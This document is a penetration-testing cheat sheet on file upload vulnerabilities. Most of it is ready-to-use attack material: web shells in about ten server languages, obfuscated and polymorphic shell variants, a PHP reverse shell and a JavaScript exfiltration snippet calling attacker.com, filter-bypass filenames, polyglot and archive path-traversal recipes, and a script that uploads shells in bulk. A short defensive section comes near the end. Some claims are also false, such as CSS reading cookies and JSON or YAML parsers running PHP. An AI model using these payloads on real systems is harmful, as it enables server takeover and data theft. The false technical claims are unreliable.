### File Upload Vulnerabilities: Concepts and Defense

File Upload Vulnerabilities occur when a web application allows users to upload files without **properly validating them**. Attackers can exploit this to upload malicious files that can lead to **Remote Code Execution (RCE)**, defacement, or server compromise.

* **Injection Point:** File upload functionality lacking comprehensive server-side validation.
* **Impact:** Remote code execution, data exfiltration, system compromise.
* **Root Cause:** The core problem is the application's failure to enforce a strict **allow-list** (whitelisting) of file types and content, often relying on easily spoofed client-side data.

File upload vulnerabilities exist because developers often **trust user input** and fail to implement comprehensive validation. When applications don't properly verify file types, content, or names, attackers can upload malicious files that get executed on the server, typically because the file is saved in a location where the web server has execution permissions.

-----

### Web Shells and Basic Payload Construction

The primary goal of an attacker is to upload a **web shell**, a script that provides a backdoor for executing system commands remotely. File uploads are performed using the `multipart/form-data` encoding.

#### Basic PHP Web Shell

```php
<?php system($_GET['cmd']); ?>
```

* **Why it's used:** This is the most basic payload to execute arbitrary **operating system commands** on a PHP server.
* **How it works:** When accessed via `http://target.com/shell.php?cmd=ls -la`, the PHP `system()` function executes the command provided in the `cmd` query parameter.

#### ASP.NET Web Shell

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e){
        Response.Write("<pre>" + new System.Diagnostics.Process(){
            StartInfo = new System.Diagnostics.ProcessStartInfo(){
                FileName = "cmd.exe", Arguments = "/c " + Request.QueryString["cmd"],
                UseShellExecute = false, RedirectStandardOutput = true
            }
        }.StandardOutput.ReadToEnd() + "</pre>");
    }
</script>
```

* **Why it's used:** To gain command execution on **IIS servers** running ASP.NET.
* **How it works:** It utilizes the .NET framework's `System.Diagnostics.Process` class to start the command interpreter (`cmd.exe`) and execute the command passed via the URL query string (`Request.QueryString["cmd"]`).

#### JSP Web Shell

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    // ... code to read output ...
%>
```

* **Why it's used:** For RCE on **Java application servers** (like Tomcat or JBoss) that process JSP files.
* **How it works:** It uses the standard Java `Runtime.getRuntime().exec(cmd)` method to execute an operating system command provided in the `cmd` request parameter.

-----

### Extension Blacklist Bypass Techniques

Attackers use these methods when the application implements an extension blacklist (e.g., blocks `.php`, `.aspx`).

#### Case Manipulation and Double Extensions

```text
shell.PHP      # Uppercase (Bypasses case-sensitive filters)
shell.php.jpg  # Double extension (If server checks only the last extension)
shell.jpg.php  # PHP at end (If server only checks the first extension)
```

* **Why it's used:** To exploit flaws in string parsing logic. Simple filters often check only for the literal blacklisted string or the last file extension.
* **How it works:** If the server is configured to treat files like `.PHP` as executable but the filter is case-sensitive and only blocks `.php`, the payload runs. Similarly, `shell.php.jpg` might satisfy a requirement for a `.jpg` extension while still being processed as PHP by the server due to misconfiguration.

#### Rare PHP Extensions

```text
shell.php3   # PHP 3
shell.php5   # PHP 5
shell.phtml  # PHP HTML
shell.inc    # Include file
```

* **Why it's used:** To exploit servers that have **alternative or older PHP handlers** configured but only block common extensions like `.php`.
* **How it works:** The web server configuration may include directives to execute files with extensions like `.phtml` or `.php5` as PHP scripts. The attacker tests these less-common extensions to find one that bypasses the blacklist but is still executable.

#### Null Byte Injection

```text
shell.php%00.jpg
```

* **Why it's used:** To exploit older programming languages (like C/C++ or older PHP versions) that treat the null byte (`%00`) as the **end-of-string character**.
* **How it works:** The filter checks the filename and sees `.jpg` because the null byte causes the string to be truncated. The file saved on the disk, however, will be named `shell.php` because the filesystem write function stops at the null byte, resulting in an executable file.

-----

### MIME Type and Magic Bytes Spoofing

These techniques are used to defeat validation checks based on the file's type and content.

#### MIME Type Spoofing

```http
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg 
```

* **Why it's used:** To bypass server-side validation that relies solely on the **Content-Type header** sent by the client.
* **How it works:** The attacker intercepts the HTTP request and changes the `Content-Type` from the script's MIME type to an allowed image type (`image/jpeg`). Since this header is client-controlled, if the server doesn't verify the actual file content, the upload succeeds.

#### Magic Bytes Prepending (Content Validation Bypass)

```bash
# Command to prepend PNG magic bytes to the shell code
echo -e '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system($_GET["cmd"]); ?>' > shell.png
```

* **Why it's used:** To bypass deep content validation that checks the file's **magic bytes** (the file signature) at the start of the file.
* **How it works:** The attacker prepends the correct binary signature (e.g., the PNG sequence) to the malicious code. The validator sees the correct header and allows the file. The web server's script interpreter will then often ignore the binary header and execute the subsequent script code.

#### GIF Magic Bytes + PHP

```bash
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
```

* **Why it's used:** This is specific to the GIF format, which has a short and simple header (`GIF89a`).
* **How it works:** By starting the file with the `GIF89a` header, the file satisfies the content check. The PHP interpreter starts reading from the beginning and executes the PHP code immediately after the short GIF signature.

-----

### Polyglot Files and Path Traversal

These techniques represent a combination of content and path manipulation for high-impact exploitation.

#### GIF/PHP Polyglot File Creation

```php
echo 'GIF89a<?php system($_GET["cmd"]); __halt_compiler();?>' > polyglot.gif
```

* **Why it's used:** To create a file that is **valid in two formats**, satisfying both the image content check and the script execution requirement.
* **How it works:** The file begins with the valid GIF header. The `__halt_compiler();` command is used to instruct the PHP interpreter to stop parsing the file immediately after the shell code, ensuring the interpreter does not try to process the remaining binary image data.

#### Path Traversal in Filenames

```text
filename: ../../../var/www/html/shell.php
```

* **Why it's used:** To achieve **Arbitrary File Write** by manipulating the upload path, forcing the file to be saved in an executable directory.
* **How it works:** If the application constructs the final file path by blindly concatenating the upload path with the user-supplied filename, the `../` sequences allow the path to escape the intended upload directory and land in the public, executable web root (`/var/www/html`).

#### Encoded Path Traversal

```text
filename: ..%2f..%2f..%2fshell.php
filename: ..%252f..%252f..%252fshell.php
```

* **Why it's used:** To bypass filters that specifically block the literal string `../` by using URL encoding.
* **How it works:** The path characters are **URL-encoded** (`%2f` for `/` or double-encoded `%252f`). The filter might check the unencoded string, but an underlying file handling function may decode the path before writing, allowing the traversal to succeed.

-----

### Archive and XML-Based Exploitation

These attacks target archive extractors and XML parsers often used for document processing.

#### ZIP Slip Attack

```bash
# Content of the malicious ZIP: 
# ../../../var/www/html/shell.php
```

* **Why it's used:** To achieve **Arbitrary File Write** when the application extracts archives without validating the file paths contained within the archive.
* **How it works:** The attacker creates a ZIP file where the internal file paths contain `../` sequences. When the extraction library fails to sanitize these paths, it writes the file outside the temporary extraction directory and into an arbitrary system location.

#### XXE in SVG Files

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg ...>
    <text x="0" y="16">&xxe;</text>
</svg>
```

* **Why it's used:** To achieve **File Disclosure** or **SSRF** when the server uses a vulnerable XML parser to process uploaded XML-based files (like SVG).
* **How it works:** The XML parser resolves the malicious **external entity** (`&xxe;`), which is instructed to retrieve the content of a local file (e.g., `/etc/passwd`). The parser inserts this file content where the entity is referenced, exposing the data.

-----

### Obfuscation and Advanced Shell Payloads

These techniques are used to evade Content-Based Intrusion Detection Systems (IDS) and keyword filters.

#### Base64 Encoding and String Concatenation

```php
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>

<?php 
    $a = 'sy' . 'stem';
    $b = $_GET['cmd'];
    $a($b); // Variable function call
?>
```

* **Why it's used:** To defeat static analysis tools that search for literal function names like `system()`, `exec()`, or `eval()`.
* **How it works:** By encoding the malicious code (Base64/Hex) or constructing the function name at runtime via **string concatenation**, the forbidden keyword never exists in the file content, only in memory during execution.

#### Reverse Shell

```php
<?php
    $sock=fsockopen("attacker.com",4444);
    exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

* **Why it's used:** To gain an **interactive shell session** (full keyboard access) instead of a simple command execution output.
* **How it works:** The script uses `fsockopen` to initiate an outbound connection from the compromised server back to an attacker's listening machine (netcat listener). It then redirects the standard I/O streams of a shell program (`/bin/sh`) over that socket.

#### EXIF Data Injection

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg
```

* **Why it's used:** To hide malicious code within seemingly safe image metadata.
* **How it works:** The web shell code is written into a harmless metadata field (`Comment`). If the application processes the image but doesn't strip the metadata, and the web server later executes the file, the script will run as the interpreter parses the file content.

-----

### Advanced Extension Bypass Techniques

Beyond basic case manipulation and double extensions, attackers employ sophisticated methods to bypass extension filters.

#### Character Insertion and Substitution

```text
shell.phphp    # Character repetition
shell.pphphp   # Multiple insertions
shell.p.hp     # Dot insertion
shell.p(hp     # Special character insertion
shell.php.     # Trailing dot
shell.php      # No extension (if allowed)
```

* **Why it's used:** To exploit filters that use simple string matching or regex patterns that can be bypassed with character manipulation.
* **How it works:** Filters might check for exact matches like ".php" but fail when characters are inserted between the letters or when the pattern is slightly modified.

#### Unicode and Encoding Variations

```text
shell.pĥp     # Unicode homoglyphs
shell.php̧    # Combining characters
shell.php%00  # Null byte (older systems)
shell.php%0a  # Newline injection
shell.php%20  # Space injection
```

* **Why it's used:** To bypass filters that don't handle Unicode characters or URL encoding properly.
* **How it works:** Unicode characters that look similar to ASCII letters can fool visual inspection, while encoding can bypass string-based filters.

#### Extension Spoofing with Compression

```bash
# Create compressed file with PHP extension
echo '<?php system($_GET["cmd"]); ?>' > shell.php
gzip shell.php
mv shell.php.gz shell.php.gz.php
```

* **Why it's used:** When servers are configured to decompress certain file types before processing.
* **How it works:** The file has a compressed extension but contains executable code. If the server decompresses .gz files, the PHP code becomes executable.

#### Multi-Extension Chains

```text
shell.php.jpg.png.gif
shell.php.jpeg.bmp.tiff
shell.php.txt.doc.pdf
```

* **Why it's used:** To satisfy multiple validation layers that check different extensions in the filename.
* **How it works:** Each extension might pass a different validation check, with the final extension being the one that determines execution.

#### Filename Length Exploitation

```text
shell.php...............................................................
shell.php[very long string]
```

* **Why it's used:** To exploit buffer limitations or truncation in validation functions.
* **How it works:** If the validation function only checks the first N characters, a long filename can bypass the check while the actual file processing uses the full name.

-----

### Content Validation Bypass Techniques

When applications perform deep content inspection, attackers need to craft files that pass validation while remaining executable.

#### Image File Polyglots

```bash
# Create a valid JPEG with embedded PHP
dd if=/dev/zero of=shell.jpg bs=1 count=100
echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
# Prepend JPEG header
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00' | cat - shell.jpg > temp && mv temp shell.jpg
```

* **Why it's used:** To create files that are valid images according to content validation but contain executable code.
* **How it works:** The file starts with a valid image header, passes content checks, but the PHP interpreter will execute the embedded code.

#### PDF Document Exploitation

```bash
# Create PDF with embedded JavaScript
cat > shell.pdf << 'EOF'
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction << /Type /Action /S /JavaScript /JS (app.alert('XSS');) >>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/ProcSet [/PDF /Text]
/Font <<
/F1 <<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
>>
>>
>>
endobj
4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Hello World) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000274 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
403
%%EOF
EOF
```

* **Why it's used:** To exploit PDF processing applications that execute embedded JavaScript or other active content.
* **How it works:** The PDF contains valid structure but includes executable JavaScript that can perform malicious actions.

#### Office Document Macros

```vba
' Excel macro with VBA code
Sub Auto_Open()
    Shell "cmd.exe /c whoami"
End Sub
```

* **Why it's used:** To exploit applications that process office documents and execute macros automatically.
* **How it works:** When the document is opened, the macro runs and executes the embedded commands.

#### Audio/Video File Exploitation

```bash
# Create WAV file with embedded data
sox -n -r 44100 -c 2 shell.wav synth 1 sine 1000
echo '<?php system($_GET["cmd"]); ?>' >> shell.wav
```

* **Why it's used:** For applications that process multimedia files and may execute embedded code.
* **How it works:** The file appears as a valid audio file but contains executable script data.

-----

### Server-Side Processing Exploitation

Exploiting how servers process different file types and extensions.

#### Apache .htaccess Exploitation

```apache
# .htaccess file to make all files executable as PHP
AddType application/x-httpd-php .jpg
php_value auto_prepend_file "shell.php"
```

* **Why it's used:** To change server behavior for uploaded files through .htaccess configuration.
* **How it works:** The .htaccess file modifies Apache's configuration to treat certain file types as PHP scripts.

#### IIS Web.config Exploitation

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule" scriptProcessor="C:\PHP\php-cgi.exe" resourceType="Unspecified" />
        </handlers>
    </system.webServer>
</configuration>
```

* **Why it's used:** To configure IIS to execute uploaded files as PHP scripts.
* **How it works:** The web.config file adds a handler that processes .jpg files with the PHP interpreter.

#### Nginx Configuration Injection

```nginx
# nginx.conf snippet
location ~* \.(jpg)$ {
    include fastcgi_params;
    fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
}
```

* **Why it's used:** To modify Nginx behavior to execute uploaded files.
* **How it works:** Configuration files can change how the server processes different file types.

#### PHP Configuration Manipulation

```ini
# .user.ini file
auto_prepend_file = shell.php
```

* **Why it's used:** To modify PHP behavior per-directory using .user.ini files.
* **How it works:** PHP reads .user.ini files to apply per-directory configuration changes.

-----

### Advanced Payload Obfuscation

Techniques to make malicious payloads undetectable by security systems.

#### Code Encryption and Obfuscation

```php
<?php
$code = 'c3lzdGVtKCRfR0VUWydjbWQnXSk7'; // base64 encoded system($_GET['cmd']);
eval(base64_decode($code));
?>
```

* **Why it's used:** To hide malicious code from static analysis and signature-based detection.
* **How it works:** The payload is encoded and only decoded at runtime, avoiding detection by scanners.

#### Polymorphic Code Generation

```php
<?php
$funcs = ['system', 'exec', 'shell_exec', 'passthru'];
$func = $funcs[array_rand($funcs)];
$cmd = $_GET['cmd'];
$func($cmd);
?>
```

* **Why it's used:** To create payloads that vary each time, making signature-based detection difficult.
* **How it works:** The code randomly selects from multiple function names, creating different signatures.

#### Whitespace and Comment Obfuscation

```php
<?php/*comment*/system/*more*/(/*cmd*/$_GET[/*param*/'cmd']/*end*/);?>
```

* **Why it's used:** To break up code patterns that security systems look for.
* **How it works:** Comments and unusual whitespace formatting can evade simple pattern matching.

#### String Reversal and Reconstruction

```php
<?php
$rev = strrev(')dm$TEG_$(metsys');
eval($rev);
?>
```

* **Why it's used:** To hide function names and code structure.
* **How it works:** Strings are reversed and reconstructed at runtime, avoiding literal matches.

#### Dynamic Function Calls

```php
<?php
$func = 'sys' . 'tem';
$param = $_GET['cmd'];
$func($param);
?>
```

* **Why it's used:** To construct function names dynamically, avoiding static analysis.
* **How it works:** Function names are built from string concatenation, only resolving at execution time.

-----

### File Upload in Different Languages

Payloads for various server-side languages beyond PHP.

#### Python Web Shell

```python
#!/usr/bin/env python
import os
import sys

cmd = os.environ.get('QUERY_STRING', '').split('cmd=')[1] if 'cmd=' in os.environ.get('QUERY_STRING', '') else ''
if cmd:
    os.system(cmd)
```

* **Why it's used:** For Python-based web applications.
* **How it works:** Executes system commands using os.system(), getting parameters from environment variables.

#### Ruby Web Shell

```ruby
#!/usr/bin/env ruby
require 'cgi'

cgi = CGI.new
cmd = cgi['cmd']
if cmd
  system(cmd)
end
```

* **Why it's used:** For Ruby-based applications like Rails.
* **How it works:** Uses the system() function to execute commands passed via CGI parameters.

#### Node.js Web Shell

```javascript
const http = require('http');
const url = require('url');
const { exec } = require('child_process');

http.createServer((req, res) => {
  const query = url.parse(req.url, true).query;
  if (query.cmd) {
    exec(query.cmd, (error, stdout, stderr) => {
      res.writeHead(200, {'Content-Type': 'text/plain'});
      res.end(stdout || stderr);
    });
  } else {
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end('Shell ready');
  }
}).listen(3000);
```

* **Why it's used:** For Node.js applications.
* **How it works:** Uses child_process.exec() to run system commands via HTTP requests.

#### Perl Web Shell

```perl
#!/usr/bin/perl
use CGI;

my $cgi = CGI->new();
my $cmd = $cgi->param('cmd');

if ($cmd) {
    system($cmd);
}
```

* **Why it's used:** For legacy Perl CGI applications.
* **How it works:** Uses system() to execute commands from CGI parameters.

#### ColdFusion Web Shell

```cfm
<cfif IsDefined("URL.cmd")>
    <cfexecute name="cmd.exe" arguments="/c #URL.cmd#" timeout="10"></cfexecute>
</cfif>
```

* **Why it's used:** For ColdFusion applications.
* **How it works:** Uses cfexecute to run system commands.

#### ASP Classic Web Shell

```asp
<%
Dim cmd
cmd = Request.QueryString("cmd")
If cmd <> "" Then
    Dim objShell
    Set objShell = Server.CreateObject("WScript.Shell")
    objShell.Run cmd
    Set objShell = Nothing
End If
%>
```

* **Why it's used:** For legacy ASP applications.
* **How it works:** Uses WScript.Shell to execute commands.

-----

### Archive-Based Attacks

Exploiting archive file processing for file upload vulnerabilities.

#### ZIP Archive Exploitation

```bash
# Create ZIP with path traversal
zip malicious.zip ../../../var/www/html/shell.php
# Add the payload file
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip malicious.zip shell.php
```

* **Why it's used:** When applications extract ZIP files without proper path validation.
* **How it works:** The ZIP contains files with path traversal sequences that write outside the extraction directory.

#### TAR Archive Exploitation

```bash
# Create TAR with path traversal
tar -cf malicious.tar ../../../var/www/html/shell.php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
tar -rf malicious.tar shell.php
```

* **Why it's used:** For TAR archive processing vulnerabilities.
* **How it works:** Similar to ZIP, TAR files can contain path traversal sequences.

#### RAR Archive Exploitation

```bash
# Create RAR with path traversal
rar a malicious.rar ../../../var/www/html/shell.php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
rar a malicious.rar shell.php
```

* **Why it's used:** For RAR archive extraction vulnerabilities.
* **How it works:** RAR archives can also contain malicious path traversal.

#### 7-Zip Archive Exploitation

```bash
# Create 7z with path traversal
7z a malicious.7z ../../../var/www/html/shell.php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
7z a malicious.7z shell.php
```

* **Why it's used:** For 7-Zip archive processing.
* **How it works:** 7-Zip files can contain path traversal sequences.

#### Nested Archive Attacks

```bash
# Create nested archives
zip inner.zip shell.php
zip outer.zip ../../../var/www/html/inner.zip
```

* **Why it's used:** To bypass single-layer archive validation.
* **How it works:** The outer archive contains a path traversal to place the inner archive in an executable location.

-----

### Database and Configuration File Exploitation

Uploading files that affect database or application configuration.

#### SQLite Database Upload

```sql
-- Create malicious SQLite database
CREATE TABLE shell (cmd TEXT);
INSERT INTO shell VALUES ('<?php system($_GET["cmd"]); ?>');

-- Save as shell.db
```

* **Why it's used:** When applications process uploaded database files.
* **How it works:** The database contains malicious data that gets executed when processed.

#### YAML Configuration Exploitation

```yaml
# malicious.yml
---
command: <?php system($_GET['cmd']); ?>
```

* **Why it's used:** For applications that parse YAML configuration files.
* **How it works:** YAML parsers may execute embedded code in certain contexts.

#### JSON Configuration Exploitation

```json
{
  "config": {
    "shell": "<?php system($_GET['cmd']); ?>"
  }
}
```

* **Why it's used:** When JSON files are processed and values are executed.
* **How it works:** JSON values containing code may be executed by vulnerable parsers.

#### XML Configuration Exploitation

```xml
<?xml version="1.0"?>
<config>
  <shell><?php system($_GET['cmd']); ?></shell>
</config>
```

* **Why it's used:** For XML configuration file processing.
* **How it works:** XML parsers may execute embedded code.

-----

### Client-Side and Browser Exploitation

Attacks that leverage browser behavior and client-side processing.

#### SVG File Exploitation

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <script>
    // JavaScript code here
    fetch('/api/shell?cmd=id')
  </script>
</svg>
```

* **Why it's used:** For applications that display uploaded SVG files.
* **How it works:** SVG files can contain JavaScript that executes when rendered.

#### HTML File Exploitation

```html
<!DOCTYPE html>
<html>
<head>
  <script>
    // Malicious JavaScript
    fetch('/api/shell?cmd=id');
  </script>
</head>
<body>
  <h1>Uploaded File</h1>
</body>
</html>
```

* **Why it's used:** When HTML files are served directly.
* **How it works:** Browsers execute JavaScript in HTML files.

#### CSS File Exploitation

```css
body {
  background: url('http://attacker.com/log?data=cookie:' + document.cookie);
}
```

* **Why it's used:** For CSS file processing that allows data exfiltration.
* **How it works:** CSS can contain URLs that leak data when processed.

#### JavaScript File Exploitation

```javascript
// Malicious JavaScript
fetch('/api/shell?cmd=id')
  .then(response => response.text())
  .then(data => {
    // Send data to attacker
    fetch('http://attacker.com/log?data=' + btoa(data));
  });
```

* **Why it's used:** When JavaScript files are executed by the application.
* **How it works:** JavaScript can perform actions when loaded.

-----

### Advanced File Processing Exploitation

Exploiting how applications process different file formats.

#### Image Processing Libraries

```bash
# Create image with embedded PHP using ImageMagick
convert -size 100x100 xc:red -pointsize 12 -fill white -annotate +10+50 '<?php system($_GET["cmd"]); ?>' shell.png
```

* **Why it's used:** When applications use image processing libraries that preserve metadata or allow code execution.
* **How it works:** Image processing tools may execute embedded code or preserve it in metadata.

#### Document Processing Exploitation

```bash
# Create Word document with macro
# (Using external tools like LibreOffice or custom scripts)
```

* **Why it's used:** For document processing applications.
* **How it works:** Documents can contain macros or embedded code.

#### Audio/Video Processing

```bash
# Create MP3 with embedded data
lame input.wav shell.mp3
echo '<?php system($_GET["cmd"]); ?>' >> shell.mp3
```

* **Why it's used:** For media processing applications.
* **How it works:** Media files can contain executable data.

#### Font File Exploitation

```bash
# Create font file with embedded code
# (Complex process requiring font editing tools)
```

* **Why it's used:** For applications that process font files.
* **How it works:** Font files can contain executable code in certain formats.

-----

### Real-World Exploitation Examples

Practical examples of file upload vulnerabilities in popular applications.

#### WordPress File Upload Vulnerability

```php
// Vulnerable plugin code
move_uploaded_file($_FILES['file']['tmp_name'], $upload_dir . $_FILES['file']['name']);
```

* **Why it's vulnerable:** No validation of file type or content.
* **Exploitation:** Upload PHP shell with .jpg extension if double extension is allowed.

#### Joomla File Upload

```php
// Vulnerable component
$filename = JFile::makeSafe($filename);
JFile::upload($src, $dest . $filename);
```

* **Why it's vulnerable:** makeSafe() only sanitizes filename, not content.
* **Exploitation:** Upload shell with allowed extension.

#### Drupal File Upload

```php
// Vulnerable module
file_save_upload('file', array('file_validate_extensions' => array('jpg png gif')));
```

* **Why it's vulnerable:** Validation can be bypassed with double extensions.
* **Exploitation:** Use .php.jpg extension.

#### Custom PHP Application

```php
// Common vulnerable pattern
if ($_FILES['file']['type'] == 'image/jpeg') {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}
```

* **Why it's vulnerable:** Only checks MIME type from client.
* **Exploitation:** Spoof Content-Type header.

#### ASP.NET Application

```csharp
// Vulnerable ASP.NET code
if (file.ContentType == "image/jpeg") {
    file.SaveAs(Server.MapPath("~/uploads/") + file.FileName);
}
```

* **Why it's vulnerable:** Only validates Content-Type.
* **Exploitation:** Change Content-Type in request.

#### Node.js Application

```javascript
// Vulnerable Node.js code
if (req.files.file.mimetype === 'image/jpeg') {
    fs.rename(req.files.file.path, './uploads/' + req.files.file.name);
}
```

* **Why it's vulnerable:** Only checks mimetype.
* **Exploitation:** Spoof mimetype in multipart request.

-----

### Detection and Prevention

Best practices for detecting and preventing file upload vulnerabilities.

#### Input Validation

```php
// Comprehensive validation
function validateUpload($file) {
    $allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
    
    // Check MIME type
    if (!in_array($file['type'], $allowedTypes)) {
        return false;
    }
    
    // Check extension
    $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($extension, $allowedExtensions)) {
        return false;
    }
    
    // Check file content
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);
    
    if (!in_array($mime, $allowedTypes)) {
        return false;
    }
    
    return true;
}
```

#### File Storage Security

```php
// Secure file storage
$uploadDir = '/var/www/uploads/';
$filename = bin2hex(random_bytes(16)) . '.jpg'; // Random filename
$filepath = $uploadDir . $filename;

// Ensure directory exists and is writable
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

// Move file
move_uploaded_file($_FILES['file']['tmp_name'], $filepath);

// Set proper permissions
chmod($filepath, 0644);
```

#### Content Analysis

```php
// Check for malicious content
function scanFile($filepath) {
    $content = file_get_contents($filepath);
    
    // Check for PHP tags
    if (preg_match('/<\?php/i', $content)) {
        return false;
    }
    
    // Check for script tags
    if (preg_match('/<script/i', $content)) {
        return false;
    }
    
    // Check for executable content
    $suspicious = ['system', 'exec', 'eval', 'shell_exec', 'passthru'];
    foreach ($suspicious as $func) {
        if (stripos($content, $func) !== false) {
            return false;
        }
    }
    
    return true;
}
```

#### Server Configuration

```apache
# Apache .htaccess
<Files *.php>
    deny from all
</Files>

<FilesMatch "\.(jpg|jpeg|png|gif)$">
    # Only allow access to image files
</FilesMatch>
```

```nginx
# Nginx configuration
location ~* \.(php|asp|jsp)$ {
    deny all;
}

location /uploads/ {
    location ~* \.(jpg|jpeg|png|gif)$ {
        # Allow only image files
    }
    deny all;
}
```

#### Monitoring and Logging

```php
// Log upload attempts
function logUpload($file, $result) {
    $log = sprintf(
        "[%s] Upload attempt: %s (%s) - %s\n",
        date('Y-m-d H:i:s'),
        $file['name'],
        $file['type'],
        $result ? 'ALLOWED' : 'BLOCKED'
    );
    file_put_contents('/var/log/uploads.log', $log, FILE_APPEND);
}
```

#### Rate Limiting

```php
// Implement upload rate limiting
session_start();
$maxUploads = 10;
$timeWindow = 3600; // 1 hour

if (!isset($_SESSION['uploads'])) {
    $_SESSION['uploads'] = [];
}

// Clean old uploads
$_SESSION['uploads'] = array_filter($_SESSION['uploads'], function($time) {
    return $time > time() - 3600;
});

if (count($_SESSION['uploads']) >= $maxUploads) {
    die('Upload limit exceeded');
}

$_SESSION['uploads'][] = time();
```

-----

### Tools and Automation

Tools for detecting and exploiting file upload vulnerabilities.

#### Manual Testing Tools

```bash
# curl for upload testing
curl -X POST -F "file=@shell.php" -F "submit=Upload" http://target.com/upload.php

# wget for download testing
wget --post-file=shell.php http://target.com/upload.php
```

#### Automated Scanners

```bash
# Nikto file upload scanning
nikto -h target.com -Tuning 2

# OWASP ZAP file upload testing
# Use active scan with file upload rules

# Burp Suite Intruder
# Payload: shell.php, shell.php.jpg, shell.php%00.jpg, etc.
```

#### Custom Exploitation Scripts

```python
import requests
import sys

def test_upload(url, file_path, field_name='file'):
    files = {field_name: open(file_path, 'rb')}
    response = requests.post(url, files=files)
    
    if 'uploaded' in response.text.lower() or response.status_code == 200:
        print(f"Upload successful: {file_path}")
        return True
    else:
        print(f"Upload failed: {file_path}")
        return False

def generate_payloads(base_name='shell'):
    payloads = [
        f'{base_name}.php',
        f'{base_name}.php.jpg',
        f'{base_name}.php%00.jpg',
        f'{base_name}.phtml',
        f'{base_name}.php3',
        f'{base_name}.php5',
    ]
    
    for payload in payloads:
        with open(payload, 'w') as f:
            f.write('<?php system($_GET["cmd"]); ?>')
    
    return payloads

if __name__ == '__main__':
    url = sys.argv[1]
    payloads = generate_payloads()
    
    for payload in payloads:
        test_upload(url, payload)
```

#### Fuzzing Tools

```bash
# ffuf for parameter discovery
ffuf -u "http://target.com/upload.php?FUZZ=value" -w parameters.txt

# gobuster for directory enumeration
gobuster dir -u http://target.com -w wordlist.txt -x php,jpg,png
```

#### Image Manipulation Tools

```bash
# exiftool for metadata injection
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg

# ImageMagick for polyglot creation
convert original.jpg -pointsize 72 -fill white -annotate +100+100 '<?php system($_GET["cmd"]); ?>' shell.jpg
```

* **Why it's used:** To automate the detection, exploitation, and testing of file upload vulnerabilities.
* **How it works:** Tools generate various payloads, test different bypass techniques, and validate successful uploads.

-----

**Made with love by VIsh0k**
